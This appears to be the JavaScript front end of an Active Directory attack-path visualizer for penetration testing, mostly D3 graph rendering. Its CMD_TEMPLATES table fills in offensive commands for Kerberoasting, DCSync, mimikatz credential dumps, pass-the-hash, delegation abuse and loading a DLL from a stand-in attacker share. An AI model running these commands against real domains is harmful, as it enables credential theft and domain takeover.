/**
 * BloodTrail Thermal Enhancement Layer
 * Overlays heat trails, chain gradients, quick-win flares on right panel only.
 */
const BloodTrailEnhance = (() => {
  let currentData = null;
  let activeChainId = null;
  let sortedChains = [];

  // HTML-escape shorthand — delegates to graph.js
  const esc = (s) => BloodTrailGraph.esc(s);

  const COLORS = {
    'white-hot': { thermal: '#ff6b2b', peak: '#fff4e0', cold: '#2266aa', quickWin: '#ffcc00' },
    'black-hot': { thermal: '#8b2500', peak: '#1a0800', cold: '#5588bb', quickWin: '#886600' },
  };

  function getPolarity() {
    return document.body.classList.contains('black-hot') ? 'black-hot' : 'white-hot';
  }

  function applyEnhancements(data) {
    currentData = data;
    const rightSvg = d3.select('#right-svg');

    rightSvg.select('defs').remove();
    const defs = rightSvg.insert('defs', ':first-child');
    _createHeatDefs(defs);

    if (window._btRightNodeGs) {
      // Pre-compute all severities in one pass instead of O(nodes * edges) per node
      const severityMap = _buildSeverityMap(data);
      window._btRightNodeGs.each(function(d) {
        const severity = severityMap.get(d.id) || 0;
        if (severity > 0) _addHeatTrails(d3.select(this), d, severity);
      });
    }

    if (data.chains && window._btRightEdges) {
      data.chains.forEach((chain, i) => _applyChainGlow(chain, i, defs));
    }

    if (data.quick_wins && window._btRightNodeGs) {
      _applyQuickWinFlares(data.quick_wins);
    }

    buildChainSidebar(data.chains || []);
  }

  function _createHeatDefs(defs) {
    const c = COLORS[getPolarity()];
    const grad = defs.append('linearGradient')
      .attr('id', 'heat-trail-grad')
      .attr('x1', 0).attr('y1', 0).attr('x2', 0).attr('y2', 1);
    grad.append('stop').attr('offset', '0%').attr('stop-color', c.thermal).attr('stop-opacity', 0.9);
    grad.append('stop').attr('offset', '60%').attr('stop-color', c.thermal).attr('stop-opacity', 0.4);
    grad.append('stop').attr('offset', '100%').attr('stop-color', c.thermal).attr('stop-opacity', 0);

    defs.append('filter').attr('id', 'heat-blur')
      .append('feGaussianBlur').attr('stdDeviation', 1.5);
  }

  // Single-pass severity computation — replaces per-node _nodeSeverity
  function _buildSeverityMap(data) {
    const map = new Map();
    const set = (id, level) => { map.set(id, Math.max(map.get(id) || 0, level)); };

    // Level 1: nodes with exploitable inbound edges
    (data.edges || []).forEach(e => {
      if (e.edge !== 'MemberOf' && e.edge !== 'Contains') set(e.target_id, 1);
    });
    // Level 2: nodes in any chain
    (data.chains || []).forEach(ch => {
      ch.steps.forEach(s => { if (s.from) set(s.from, 2); if (s.to) set(s.to, 2); });
    });
    // Level 3: quick wins, domains, admin accounts
    (data.quick_wins || []).forEach(q => set(q.node, 3));
    (data.nodes || []).forEach(n => {
      if (n.label === 'Domain' || n.props?.admincount) set(n.id, 3);
    });
    return map;
  }

  function _getNodeRadius(g) {
    // Get bounding size from the path shape
    const shape = g.select('.node-shape').node();
    if (!shape) return 9;
    const bbox = shape.getBBox();
    return Math.max(bbox.width, bbox.height) / 2;
  }

  function _addHeatTrails(g, node, severity) {
    const count = Math.min(severity, 3);
    const baseLen = severity === 3 ? 42 : severity === 2 ? 28 : 16;
    const r = _getNodeRadius(g);

    for (let i = 0; i < count; i++) {
      const xOff = (i - (count - 1) / 2) * 4 + (Math.random() - 0.5) * 2;
      const len = baseLen + (Math.random() - 0.5) * 10;
      const cx1 = xOff + (Math.random() - 0.5) * 3;
      const cx2 = xOff + (Math.random() - 0.5) * 2;
      const sw = 2.5 - i * 0.5 + Math.random() * 0.5;

      g.append('path')
        .attr('class', `heat-trail trail-${i + 1}`)
        .attr('d', `M${xOff},${r} Q${cx1},${r + len * 0.4} ${xOff},${r + len * 0.7} Q${cx2},${r + len * 0.85} ${xOff},${r + len}`)
        .attr('fill', 'none')
        .attr('stroke', 'url(#heat-trail-grad)')
        .attr('stroke-width', sw)
        .attr('stroke-linecap', 'round')
        .attr('filter', 'url(#heat-blur)');

      if (i === 0) {
        g.append('circle')
          .attr('class', 'heat-point')
          .attr('cx', xOff).attr('cy', r + len + 3).attr('r', 2.5)
          .attr('fill', COLORS[getPolarity()].thermal)
          .attr('opacity', 0.5)
          .attr('filter', 'url(#heat-blur)');
      }
    }
  }

  function _applyChainGlow(chain, index, defs) {
    if (!chain.steps || !window._btRightEdges) return;
    const c = COLORS[getPolarity()];
    const gradId = `chain-grad-${index}`;

    const grad = defs.append('linearGradient').attr('id', gradId)
      .attr('x1', 0).attr('y1', 0).attr('x2', 1).attr('y2', 0);
    grad.append('stop').attr('offset', '0%').attr('stop-color', c.cold);
    grad.append('stop').attr('offset', '50%').attr('stop-color', c.thermal);
    grad.append('stop').attr('offset', '100%').attr('stop-color', c.peak);

    chain.steps.forEach(step => {
      if (!step.from || !step.to) return;
      window._btRightEdges
        .filter(d => d.source_id === step.from && d.target_id === step.to)
        .attr('class', 'edge-path edge-chain')
        .attr('stroke', `url(#${gradId})`)
        .attr('data-chain', chain.id)
        .style('stroke-dasharray', '4 16');
    });
  }

  function _applyQuickWinFlares(quickWins) {
    if (!window._btRightNodeGs) return;
    const qwNodes = new Set(quickWins.map(q => q.node));
    const c = COLORS[getPolarity()];

    window._btRightNodeGs.each(function(d) {
      if (!qwNodes.has(d.id)) return;
      const g = d3.select(this);
      const r = _getNodeRadius(g);
      const qw = quickWins.find(q => q.node === d.id);

      g.append('circle')
        .attr('class', 'qw-ring')
        .attr('r', r + 5)
        .attr('fill', 'none')
        .attr('stroke', c.quickWin)
        .attr('stroke-width', 1)
        .attr('stroke-dasharray', '3 3')
        .attr('opacity', 0.6)
        .style('animation', 'quick-win-flare 2s ease-in-out infinite');

      g.append('text')
        .attr('class', 'qw-label')
        .attr('dy', -(r + 20))
        .attr('text-anchor', 'middle')
        .attr('fill', c.quickWin)
        .attr('font-size', '0.4rem')
        .attr('font-family', 'JetBrains Mono, monospace')
        .attr('font-weight', 600)
        .attr('opacity', 0)
        .text(qw?.type?.replace(/_/g, ' ').toUpperCase().slice(0, 22) || '');
    });
  }

  let _chainItemEls = [];

  function buildChainSidebar(chains) {
    const sidebar = document.getElementById('chain-sidebar');
    if (!chains.length) { sidebar.innerHTML = ''; _chainItemEls = []; return; }

    const sevWeight = { critical: 0, high: 1, medium: 2 };
    sortedChains = [...chains].sort((a, b) => {
      const sw = (sevWeight[a.severity] ?? 3) - (sevWeight[b.severity] ?? 3);
      return sw !== 0 ? sw : (b.steps?.length || 0) - (a.steps?.length || 0);
    });

    sidebar.innerHTML = `<div class="sidebar-header">Attack Chains (${chains.length})</div>` +
      sortedChains.map(ch => `
        <div class="chain-item" data-chain="${esc(ch.id)}">
          <span class="chain-name">${esc(ch.name)}</span>
          <span class="severity-badge severity-${esc(ch.severity)}">${esc(ch.severity)}</span>
        </div>
      `).join('');

    _chainItemEls = [...sidebar.querySelectorAll('.chain-item')];
    _chainItemEls.forEach(el => {
      el.addEventListener('click', () => highlightChain(el.dataset.chain));
    });
  }

  function highlightChain(chainId) {
    if (!currentData) return;
    const isToggle = activeChainId === chainId;
    activeChainId = isToggle ? null : chainId;

    _chainItemEls.forEach(el => {
      el.classList.toggle('active', el.dataset.chain === activeChainId);
    });

    const rightSvg = d3.select('#right-svg');


    const dur = 400;
    const leftSvg = d3.select('#left-svg');

    if (isToggle || !activeChainId) {
      // Fade everything back
      if (window._btRightEdges) window._btRightEdges.transition().duration(dur).style('opacity', null);
      if (window._btRightNodeGs) window._btRightNodeGs.transition().duration(dur).style('opacity', null);
      if (window._btLeftEdges) window._btLeftEdges.transition().duration(dur).style('opacity', null);
      if (window._btLeftNodeGs) window._btLeftNodeGs.transition().duration(dur).style('opacity', null);
      rightSvg.selectAll('.edge-group').transition().duration(dur).style('opacity', null);
      leftSvg.selectAll('.edge-group').transition().duration(dur).style('opacity', null);
      showExecutionChain(null);
      _resetZoom();
      return;
    }

    const chain = currentData.chains.find(c => c.id === chainId);
    if (!chain) return;

    const chainNodes = new Set();
    const chainEdgeKeys = new Set();
    chain.steps.forEach((s, i) => {
      if (s.from) chainNodes.add(s.from);
      if (s.to) chainNodes.add(s.to);
      chainEdgeKeys.add(`${s.from}→${s.to}`);
    });

    // Cross-fade to new chain on both panels
    const edgeOp = d => chainEdgeKeys.has(`${d.source_id}→${d.target_id}`) ? 1 : 0.03;
    const nodeOp = d => chainNodes.has(d.id) ? 1 : 0.05;

    if (window._btRightEdges) window._btRightEdges.transition().duration(dur).style('opacity', edgeOp);
    if (window._btLeftEdges) window._btLeftEdges.transition().duration(dur).style('opacity', edgeOp);
    rightSvg.selectAll('.edge-group').transition().duration(dur).style('opacity', edgeOp);
    leftSvg.selectAll('.edge-group').transition().duration(dur).style('opacity', edgeOp);

    if (window._btRightNodeGs) window._btRightNodeGs.transition().duration(dur).style('opacity', nodeOp);
    if (window._btLeftNodeGs) window._btLeftNodeGs.transition().duration(dur).style('opacity', nodeOp);

    _zoomToChain(chainNodes);
    showExecutionChain(chainId);
  }

  function _resetZoom() {
    const transform = d3.zoomIdentity;
    const rightSvg = d3.select('#right-svg');
    const leftSvg = d3.select('#left-svg');
    rightSvg.transition().duration(500).call(d3.zoom().transform, transform);
    leftSvg.transition().duration(500).call(d3.zoom().transform, transform);
    d3.select('#right-svg g').transition().duration(500).attr('transform', transform);
    d3.select('#left-svg g').transition().duration(500).attr('transform', transform);
  }

  function _zoomToChain(chainNodes) {
    if (!window._btNodes) return;
    const nodes = window._btNodes.filter(n => chainNodes.has(n.id));
    if (!nodes.length) return;

    let minX = Infinity, maxX = -Infinity, minY = Infinity, maxY = -Infinity;
    nodes.forEach(n => {
      minX = Math.min(minX, n.x); maxX = Math.max(maxX, n.x);
      minY = Math.min(minY, n.y); maxY = Math.max(maxY, n.y);
    });

    const pad = 80;
    minX -= pad; maxX += pad; minY -= pad; maxY += pad;

    const rightPanel = document.getElementById('right-panel');
    const sidebarW = 240;
    const execChainH = 180;
    const pw = rightPanel.clientWidth - sidebarW, ph = rightPanel.clientHeight - execChainH;
    const bw = maxX - minX, bh = maxY - minY;
    const scale = Math.min(pw / bw, ph / bh, 2.5);
    const cx = (minX + maxX) / 2, cy = (minY + maxY) / 2;
    const tx = pw / 2 - cx * scale, ty = ph / 2 - cy * scale;

    const transform = d3.zoomIdentity.translate(tx, ty).scale(scale);
    const rightSvg = d3.select('#right-svg');
    const leftSvg = d3.select('#left-svg');
    rightSvg.transition().duration(500).call(d3.zoom().transform, transform);
    leftSvg.transition().duration(500).call(d3.zoom().transform, transform);
    d3.select('#right-svg g').transition().duration(500).attr('transform', transform);
    d3.select('#left-svg g').transition().duration(500).attr('transform', transform);
  }

  function markAsPwned(nodeId) {
    if (!window._btEdges || !window._btRightNodeGs) return;
    const exploitableTypes = new Set([
      'AdminTo', 'CanRDP', 'CanPSRemote', 'GenericAll', 'GenericWrite',
      'WriteDacl', 'ForceChangePassword', 'AddKeyCredentialLink',
      'WriteAccountRestrictions', 'AllowedToDelegate', 'CoerceToTGT', 'ExecuteDCOM',
    ]);

    const adj = {};
    window._btEdges.forEach(e => {
      if (exploitableTypes.has(e.edge)) {
        adj[e.source_id] = adj[e.source_id] || [];
        adj[e.source_id].push(e.target_id);
      }
    });

    const visited = new Set([nodeId]);
    let frontier = [nodeId];
    const c = COLORS[getPolarity()];

    const wave = () => {
      if (!frontier.length) return;
      const next = [];
      frontier.forEach(nid => {
        window._btRightNodeGs.filter(d => d.id === nid).each(function() {
          const g = d3.select(this);
          g.select('.node-shape')
            .transition().duration(400)
            .attr('fill', c.peak)
            .attr('stroke', c.thermal)
            .attr('stroke-width', 2.5);
          g.append('circle')
            .attr('r', 0).attr('fill', 'none')
            .attr('stroke', c.thermal).attr('stroke-width', 2).attr('opacity', 0.8)
            .transition().duration(600)
            .attr('r', 40).attr('opacity', 0)
            .remove();
        });
        (adj[nid] || []).forEach(t => {
          if (!visited.has(t)) { visited.add(t); next.push(t); }
        });
      });
      frontier = next;
      if (next.length) setTimeout(wave, 200);
    };
    wave();
  }

  window.addEventListener('dblclick', (e) => {
    const group = e.target.closest('.node-group');
    if (group && group.closest('#right-panel')) {
      const nodeId = group.dataset.id;
      if (nodeId) markAsPwned(nodeId);
    }
  });

  function updateHeatTrailColors(polarity) {
    const c = COLORS[polarity];
    const rightSvg = d3.select('#right-svg');

    rightSvg.selectAll('#heat-trail-grad stop').attr('stop-color', c.thermal);
    rightSvg.selectAll('.heat-point').attr('fill', c.thermal);
    rightSvg.selectAll('.qw-ring').attr('stroke', c.quickWin);
    rightSvg.selectAll('.qw-label').attr('fill', c.quickWin);

    rightSvg.selectAll('[id^="chain-grad-"]').each(function() {
      const stops = d3.select(this).selectAll('stop');
      stops.filter((d, i) => i === 0).attr('stop-color', c.cold);
      stops.filter((d, i) => i === 1).attr('stop-color', c.thermal);
      stops.filter((d, i) => i === 2).attr('stop-color', c.peak);
    });
  }

  // === Execution Chain Component ===

  // Maps action types to executable command templates
  // {target} = target host/domain, {user} = username, {from}/{to} = node display names
  const CMD_TEMPLATES = {
    'Kerberoast':              { tool: 'impacket',  cmd: 'GetUserSPNs.py {domain}/{user} -request -outputfile kerberoast.hash', note: 'Crack with hashcat -m 13100' },
    'AS-REP Roast':            { tool: 'impacket',  cmd: 'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep.hash', note: 'Crack with hashcat -m 18200' },
    'AdminTo':                 { tool: 'impacket',  cmd: 'psexec.py {domain}/{user}@{to_host}', note: 'Alt: wmiexec.py, smbexec.py' },
    'HasSession':              { tool: 'mimikatz',   cmd: 'sekurlsa::logonpasswords', note: 'Run on {to_host} as SYSTEM to extract creds' },
    'DCSync':                  { tool: 'impacket',  cmd: 'secretsdump.py {domain}/{user}@{dc} -just-dc', note: 'Dumps all domain NTLM hashes' },
    'GenericAll':              { tool: 'bloodyAD',   cmd: 'bloodyAD -d {domain} -u {user} -p \'PASS\' set password {to_name} \'NewP@ss123\'', note: 'Full control — reset password or add to group' },
    'GenericWrite':            { tool: 'impacket',  cmd: 'targetedKerberoast.py -d {domain} -u {user} -p \'PASS\'', note: 'Set SPN then kerberoast target' },
    'WriteDacl':               { tool: 'impacket',  cmd: 'dacledit.py -action write -rights DCSync -principal {user} -target-dn \'{to_dn}\' {domain}/{user}', note: 'Grant DCSync rights via DACL' },
    'AddMember':               { tool: 'net',       cmd: 'net rpc group addmem "{to_name}" "{user}" -U {domain}/{user} -S {dc}', note: 'Add user to group' },
    'AddKeyCredentialLink':    { tool: 'pywhisker',  cmd: 'pywhisker.py -d {domain} -u {user} -p \'PASS\' --target {to_name} --action add', note: 'Shadow credentials — then request TGT with PKINIT' },
    'Authenticate':            { tool: 'certipy',    cmd: 'certipy auth -pfx {to_name}.pfx -dc-ip {dc_ip}', note: 'PKINIT auth with shadow credential' },
    'MemberOf':                { tool: 'info',       cmd: null, note: 'Existing group membership — no action needed' },
    'WriteAccountRestrictions': { tool: 'impacket',  cmd: 'rbcd.py -delegate-to {to_name} -delegate-from YOURPC$ -action write {domain}/{user}', note: 'Configure RBCD on target' },
    'RBCD':                    { tool: 'impacket',  cmd: 'getST.py -spn cifs/{to_host} -impersonate Administrator {domain}/YOURPC$ -dc-ip {dc_ip}', note: 'S4U2Proxy → service ticket as Admin' },
    'CoerceToTGT':             { tool: 'petitpotam', cmd: 'petitpotam.py -d {domain} {from_host} {to_host}', note: 'Coerce target DC to authenticate back' },
    'CaptureTGT':              { tool: 'rubeus',     cmd: 'Rubeus.exe monitor /interval:5 /nowrap', note: 'Capture TGT from unconstrained delegation' },
    'CanPSRemote':             { tool: 'evil-winrm', cmd: 'evil-winrm -i {to_host} -u {user} -p \'PASS\'', note: 'PowerShell remoting access' },
    'CanRDP':                  { tool: 'xfreerdp',   cmd: 'xfreerdp /v:{to_host} /u:{user} /d:{domain}', note: 'RDP access' },
    'ExtractKeys':             { tool: 'mimikatz',   cmd: 'sekurlsa::ekeys', note: 'Extract machine account keys on target' },
    'S4U2Self':                { tool: 'impacket',  cmd: 'getST.py -self -impersonate Administrator -altservice cifs/{dc} {domain}/{from_name}$ -k -no-pass', note: 'S4U2Self ticket request' },
    'S4U2Proxy':               { tool: 'impacket',  cmd: 'getST.py -spn cifs/{to_host} -impersonate Administrator {domain}/{from_name}$ -k -no-pass', note: 'Constrained delegation → target service' },
    'DnsAdmin DLL':            { tool: 'dnscmd',     cmd: 'dnscmd {to_host} /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll', note: 'Restart DNS service to trigger DLL load' },
    'SYSTEM':                  { tool: 'result',     cmd: null, note: 'SYSTEM shell obtained on target' },
    'SetSPN':                  { tool: 'bloodyAD',   cmd: 'bloodyAD -d {domain} -u {user} -p \'PASS\' set object {to_name} servicePrincipalName -v HTTP/{to_name}', note: 'Set fake SPN for targeted kerberoast' },
    'BackupSAM':               { tool: 'reg',        cmd: 'reg save HKLM\\SAM C:\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM', note: 'Backup Operators can save registry hives' },
    'ExtractHashes':           { tool: 'impacket',  cmd: 'secretsdump.py -sam SAM -system SYSTEM LOCAL', note: 'Extract NTLM hashes from saved hives' },
    'PassTheHash':             { tool: 'impacket',  cmd: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH {domain}/Administrator@{to_host}', note: 'Pass-the-hash with extracted NTLM' },
    'Compromise':              { tool: 'info',       cmd: null, note: 'Prerequisite — use prior chain or known credentials' },
    'Monitor':                 { tool: 'rubeus',     cmd: 'Rubeus.exe monitor /interval:5 /nowrap /targetuser:{to_name}$', note: 'Monitor for incoming TGTs on unconstrained host' },
    'GrantDCSync':             { tool: 'impacket',  cmd: 'dacledit.py -action write -rights DCSync -principal {user} -target-dn \'{to_dn}\' {domain}/{user}', note: 'Grant DCSync via WriteDACL' },
    'CreateUser':              { tool: 'net',        cmd: 'net user fakeuser P@ssw0rd123 /add /domain', note: 'Account Operators can create domain users' },
    'ForestCompromise':        { tool: 'result',     cmd: null, note: 'Full forest compromise achieved' },
  };

  function _resolveCmd(template, step, chain, data) {
    if (!template || !template.cmd) return null;
    const nodes = data?.nodes || [];
    const fromNode = nodes.find(n => n.id === step.from);
    const toNode = nodes.find(n => n.id === step.to);
    const domain = data?.meta?.name || 'DOMAIN';
    const dc = nodes.find(n => n.label === 'Domain')?.name || domain;
    const dcComp = nodes.find(n => n.props?.is_dc)?.name || 'DC01';

    const shortN = (n) => n ? n.name.split('@')[0].split('.')[0] : '?';

    return template.cmd
      .replace(/\{domain\}/g, domain)
      .replace(/\{user\}/g, shortN(fromNode))
      .replace(/\{from_name\}/g, shortN(fromNode))
      .replace(/\{to_name\}/g, shortN(toNode))
      .replace(/\{from_host\}/g, fromNode?.name || '?')
      .replace(/\{to_host\}/g, toNode?.name || '?')
      .replace(/\{dc\}/g, dcComp)
      .replace(/\{dc_ip\}/g, '10.10.10.X')
      .replace(/\{to_dn\}/g, `DC=${domain.split('.').join(',DC=')}`);
  }

  function _stepIcon(action, template) {
    if (!template) return '\u2699';          // gear
    if (template.tool === 'result') return '\u2714'; // checkmark
    if (template.tool === 'info') return '\u2139';   // info
    return '\u25B6';                          // play triangle
  }

  let _execSwapTimer = null;

  function _buildExecHtml(chain, shortN) {
    const stepsHtml = chain.steps.map((step, i) => {
      const template = CMD_TEMPLATES[step.action];
      const cmd = _resolveCmd(template, step, chain, currentData);
      const isInfo = template?.tool === 'info' || template?.tool === 'result';
      const arrow = step.to ? `${esc(shortN(step.from))} \u2192 ${esc(shortN(step.to))}` : esc(shortN(step.from));
      const connector = i < chain.steps.length - 1 ? '<div class="step-connector">\u25B6</div>' : '';

      return `
        <div class="chain-step ${isInfo ? 'chain-step-info' : ''}">
          ${isInfo ? '<div class="step-info-label">CONTEXT*</div>' : ''}
          <div class="step-header">
            <span class="step-number">${i + 1}</span>
            <span class="step-action">${esc(step.action)}</span>
            ${template?.tool && !isInfo ? `<span class="step-tool">${esc(template.tool)}</span>` : ''}
          </div>
          <div class="step-arrow">${arrow}</div>
          <div class="step-desc">${esc(step.description)}</div>
          ${cmd ? `<div class="step-cmd"><code>${esc(cmd)}</code></div>` : ''}
          ${template?.note ? `<div class="step-note">${esc(template.note)}</div>` : ''}
        </div>${connector}`;
    }).join('');

    const safeId = esc(chain.id).replace(/'/g, "\\'");
    return `
      <div class="exec-header">
        <span class="exec-label">EXECUTION CHAIN</span>
        <span class="severity-badge severity-${esc(chain.severity)}">${esc(chain.severity)}</span>
        <span class="exec-name">${esc(chain.name)}</span>
        <button class="exec-close" onclick="BloodTrailEnhance.highlightChain('${safeId}')">\u2715</button>
      </div>
      <div class="exec-steps">${stepsHtml}</div>`;
  }

  function showExecutionChain(chainId) {
    const el = document.getElementById('execution-chain');
    if (_execSwapTimer) { clearTimeout(_execSwapTimer); _execSwapTimer = null; }

    if (!currentData || !chainId) {
      el.classList.add('exec-fade-out');
      _execSwapTimer = setTimeout(() => {
        el.classList.remove('visible', 'exec-fade-out');
      }, 250);
      return;
    }

    const chain = currentData.chains.find(c => c.id === chainId);
    if (!chain) { el.classList.remove('visible'); return; }

    const nodes = currentData.nodes || [];
    const shortN = (id) => {
      const n = nodes.find(nn => nn.id === id);
      return n ? n.name.split('@')[0].split('.')[0] : '?';
    };

    const isAlreadyVisible = el.classList.contains('visible');

    if (isAlreadyVisible) {
      // Cross-fade: fade out old, swap, fade in new
      el.classList.add('exec-fade-out');
      _execSwapTimer = setTimeout(() => {
        el.innerHTML = _buildExecHtml(chain, shortN);
        el.classList.remove('exec-fade-out');
      }, 250);
    } else {
      // First open: just populate and slide up
      el.innerHTML = _buildExecHtml(chain, shortN);
      el.classList.add('visible');
    }
  }

  function getSortedChains() { return sortedChains; }

  return { applyEnhancements, updateHeatTrailColors, highlightChain, markAsPwned, showExecutionChain, getSortedChains };
})();
